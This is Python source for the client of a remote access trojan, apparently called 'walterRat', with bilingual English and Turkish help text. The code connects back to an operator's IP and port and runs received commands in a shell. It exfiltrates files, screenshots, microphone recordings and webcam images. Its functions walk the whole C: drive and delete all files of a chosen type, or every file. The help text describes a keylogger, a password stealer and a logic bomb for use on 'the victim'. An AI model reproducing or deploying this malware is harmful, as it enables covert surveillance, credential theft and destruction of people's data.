# -*- coding: cp1254 -*-
class Health:
    def __init__(self,ip,port):
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        
    def esc(self,com):
        return subprocess.check_output(com,shell=True)
    def cd(self,path):
        os.chdir(path)
        return "[+]Changing working directory to"+path
    def rs(self,data):
        try:
            json_data=json.dumps(data).encode("utf-8")
            self.connection.send(json_data)
        except:
            json_data=json.dumps(base64.b64encode(data))
            self.connection.send(str(json_data.decode("utf-8")))
    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())
    def write_file(self,path,content):
        with open(path,"wb") as file:
            content=content.encode("utf-8")
            file.write(base64.b64decode(content))
            return "[+]Upload Successful"
    def del_exe(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                elif(i.endswith(".exe")):
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    def del_pdf(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                elif(i.endswith(".pdf")):
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    def del_lnk(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                elif(i.endswith(".lnk")):
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    def del_png(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                elif(i.endswith(".png")):
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    def del_jpg(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                elif(i.endswith(".jpg")):
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    def del_mp3(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                elif(i.endswith(".mp3")):
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    def del_mp4(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                elif(i.endswith(".mp4")):
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    def del_doc(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                elif(i.endswith(".doc")):
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    def del_docx(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                elif(i.endswith(".docx")):
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    def del_xlsx(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                elif(i.endswith(".xlsx")):
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    def del_txt(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                elif(i.endswith(".txt")):
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    def del_xml(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                elif(i.endswith(".xml")):
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    def del_all(self):
        filename=os.path.basename(sys.argv[0])
        locate=os.environ["APPDATA"]
        os.chdir(locate)
        for a,b,c in os.walk("C:/"):
            for i in c:
                if i==str(filename):
                    pass
                else:
                    try:
                        os.chdir(a)
                        command="del %s /Q"%i
                        os.system(command)
                    except:
                        pass
    
    def helper(self):
        return """
     **************************************************************************************
        -->voice_recorder       [this command records victim's voice(THIS TAKES A WHILE YOU HAVE TO WAIT)]
        -->voice_recorder       [bu komut kurban'in sesini kaydeder(BU BIRAZ VAKIT ALIYOR BEKLEMEN LAZIM)]
        ---------------------------------------------------------------------------------
        -->screenshot           [this command takes screen shot of the victim's system]
        -->screenshot           [bu komut kurban'in ekran goruntusunu alir]
        ---------------------------------------------------------------------------------
        -->download 'parameter' [this command downloads the parameter]
        -->download 'parameter' [bu komut parameter'i indirir]
        ---------------------------------------------------------------------------------
        -->upload 'parameter'   [this command uploads the parameter]
        -->upload 'parameter'   [bu komut parameter'i upload eder]
        ---------------------------------------------------------------------------------
        -->webcam_shot           [this command takes webcam shot of the victim's]
        -->webcam_shot           [bu komut kurban'in webcam goruntusunu alir]
        ---------------------------------------------------------------------------------
        -->keylogger            [Go back to walterRat and generate keylogger.exe.After that
                                 upload the generated file to victim's system]
        -->keylogger            [walterRat'a don ve keylogger olustur ardindan olusan
                                 dosyayi kurban makineye upload et]
        ---------------------------------------------------------------------------------
        -->password_stealer     [In same folder,there is a file named password_stealer.exe
                                 upload it to victim's machine and give the
                                 'password_stealer.exe all' command from listener]
        -->password_stealer     [Ayni dizinde password_stealer.exe dosyasi var
                                 bu dosyayi hedef sisteme upload et ve
                                 'password_stealer.exe all' komutunu gir]
        ---------------------------------------------------------------------------------
        -->del_exe              [This command will delete all of exe files
                                 on victim's system(except virus)]
        -->del_exe              [Bu komut kurban makinedeki tum exe dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->del_pdf              [This command will delete all of pdf files
                                 on victim's system(except virus)]
        -->del_pdf              [Bu komut kurban makinedeki tum pdf dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->del_lnk              [This command will delete all of lnk files
                                 on victim's system(except virus)]
        -->del_lnk              [Bu komut kurban makinedeki tum lnk dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->del_png              [This command will delete all of png files
                                 on victim's system(except virus)]
        -->del_png              [Bu komut kurban makinedeki tum png dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->del_jpg              [This command will delete all of jpg files
                                 on victim's system(except virus)]
        -->del_jpg              [Bu komut kurban makinedeki tum jpg dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->del_xml              [This command will delete all of xml files
                                 on victim's system(except virus)]
        -->del_xml              [Bu komut kurban makinedeki tum xml dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->del_mp3              [This command will delete all of mp3 files
                                 on victim's system(except virus)]
        -->del_mp3              [Bu komut kurban makinedeki tum mp3 dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->del_mp4              [This command will delete all of mp3 files
                                 on victim's system(except virus)]
        -->del_mp4              [Bu komut kurban makinedeki tum mp4 dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->del_xlsx             [This command will delete all of xlsx files
                                 on victim's system(except virus)]
        -->del_xlsx             [Bu komut kurban makinedeki tum xlsx dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->del_docx             [This command will delete all of docx files
                                 on victim's system(except virus)]
        -->del_docx             [Bu komut kurban makinedeki tum docx dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->del_doc              [This command will delete all of doc files
                                 on victim's system(except virus)]
        -->del_doc              [Bu komut kurban makinedeki tum doc dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->del_txt              [This command will delete all of txt files
                                 on victim's system(except virus)]
        -->del_txt              [Bu komut kurban makinedeki tum txt dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->del_all              [This command will delete all of pdf,exe,png etc. files
                                 on victim's system(except virus)]
        -->del_all              [Bu komut kurban makinedeki tum pdf,exe,png vs. dosyalarini siler
                                 (virusu haric)]
        ---------------------------------------------------------------------------------
        -->logic_bomb           [With logic bomb viruses you can replace contents of all pdf,
                                 txt,doc,docx,xlsx files.
                                 Go Back to walterRat and choose logic bomb option.Then,
                                 upload and run it from listener.]                                
        -->logic_bomb           [Logic Bomb ile kurban sistemdeki butun pdf,
                                 txt,doc,docx,xlsx dosyalarinin uzantilarini degistirebilirsin
                                 walterRat'a don ve logic bomb secenegini sec.Ardindan
                                 upload edip calistir.]
     **************************************************************************************
        """
   
    def rr(self):
        json_data=""
        while True:
            try:
                json_data=json_data+self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def take_ss(self):
        temp_folder=tempfile.gettempdir()
        os.chdir(temp_folder)
        pyautogui.screenshot("resim.png")
        
    
        
    def password_stealer(self):
        return """
---------------------------------------------------------------------------------
        -->password_stealer     [In same folder,there is a file named password_stealer.exe
                                 upload it to victim's machine and give the
                                 'password_stealer.exe all' command from listener]
        -->password_stealer     [Ayni dizinde password_stealer.exe dosyasi var
                                 bu dosyayi hedef sisteme upload et ve
                                 'password_stealer.exe all' komutunu gir]
---------------------------------------------------------------------------------
"""
    def keylogger(self):
        return """
    ---------------------------------------------------------------------------------
        -->keylogger            [Go back to walterRat and generate keylogger.exe.After that
                                 upload the generated file to victim's system]
        -->keylogger            [walterRat'a don ve keylogger olustur ardindan olusan
                                 dosyayi kurban makineye upload et]
    ---------------------------------------------------------------------------------
"""
    def mic_rec(self):
        temp_folder=tempfile.gettempdir()
        os.chdir(temp_folder)
        fs=44100
        second=10
        record_voice=sounddevice.rec(int(second*fs),samplerate=fs,channels=2)
        sounddevice.wait()
        write("output.wav",fs,record_voice)
    def webcam_shot(self):
        cam=cv2.VideoCapture(0)
        img_counter=0
        ret,frame=cam.read()
        k=cv2.waitKey(1)   
        img_name="image.png".format(img_counter)
        cv2.imwrite(img_name,frame)
        img_counter+=1
        cam.release()
        cv2.destroyAllWindows()
    def run(self):
        while True:
            try:
                com=self.rr()
                if com[0]=="exit":
                    self.connection.close()
                    exit()
                elif com[0]=="cd" and len(com)>1:
                    self.cd(com[1])
                elif com[0]=="download":
                    com_result=self.read_file(com[1])
                elif com[0]=="upload":
                    com_result=self.write_file(com[1],com[2])
                elif com[0]=="screenshot":
                    self.take_ss()
                    com_result=self.read_file("resim.png")
                    os.system("del resim.png &")
                elif com[0]=="voice_recorder" or com[0]=="voice_record":
                    self.mic_rec()
                    com_result=self.read_file("output.wav")
                    os.system("del output.wav")
                elif com[0]=="keylogger":
                    com_result=self.keylogger()
                elif com[0]=="webcam_shot":
                    self.webcam_shot()
                    com_result=self.read_file("image.png")
                    os.system("del image.png")
                elif com[0]=="password_stealer":
                    com_result=self.password_stealer()
                elif com[0]=="help":
                    com_result=self.helper()
                    
                elif com[0]=="del_exe":
                    com_result="[!]Exe Files Are Being Deleted.."
                    self.del_exe()
                    com_result="[+]Exe Files Deleted Successfully."
                elif com[0]=="del_pdf":
                    com_result="[!]Pdf Files Are Being Deleted.."
                    self.del_pdf()
                    com_result="[+]Pdf Files Deleted Successfully."
                elif com[0]=="del_png":
                    com_result="[!]Png Files Are Being Deleted.."
                    self.del_png()
                    com_result="[+]Png Files Deleted Successfully."
                elif com[0]=="del_jpg":
                    com_result="[!]Jpg Files Are Being Deleted.."
                    self.del_jpg()
                    com_result="[+]Jpg Files Deleted Successfully."
                elif com[0]=="del_mp3":
                    com_result="[!]Mp3 Files Are Being Deleted.."
                    self.del_mp3()
                    com_result="[+]Mp3 Files Deleted Successfully."
                elif com[0]=="del_mp4":
                    com_result="[!]Mp4 Files Are Being Deleted.."
                    self.del_mp4()
                    com_result="[+]Mp4 Files Deleted Successfully."
                elif com[0]=="del_lnk":
                    com_result="[!]Lnk Files Are Being Deleted.."
                    self.del_lnk()
                    com_result="[+]Lnk Files Deleted Successfully."
                elif com[0]=="del_doc":
                    com_result="[!]Doc Files Are Being Deleted.."
                    self.del_doc()
                    com_result="[+]Doc Files Deleted Successfully."
                elif com[0]=="del_docx":
                    com_result="[!]Docx Files Are Being Deleted.."
                    self.del_docx()
                    com_result="[+]Docx Files Deleted Successfully."
                elif com[0]=="del_xlsx":
                    com_result="[!]Xlsx Files Are Being Deleted.."
                    self.del_xlsx()
                    com_result="[+]Xlsx Files Deleted Successfully."
                elif com[0]=="del_xml":
                    com_result="[!]Xml Files Are Being Deleted.."
                    self.del_xml()
                    com_result="[+]Xml Files Deleted Successfully."
                elif com[0]=="del_txt":
                    com_result="[!]Txt Files Are Being Deleted.."
                    self.del_txt()
                    com_result="[+]Txt Files Deleted Successfully."
                elif com[0]=="del_all":
                    com_result="[!]All Files Are Being Deleted.."
                    self.del_all()
                    com_result="[+]All Files Deleted Successfully."
                else:
                    com_result=self.esc(com)
                    
                self.rs(com_result)
            except:
                com_result="[-]Error!"
                self.rs(com_result)

    
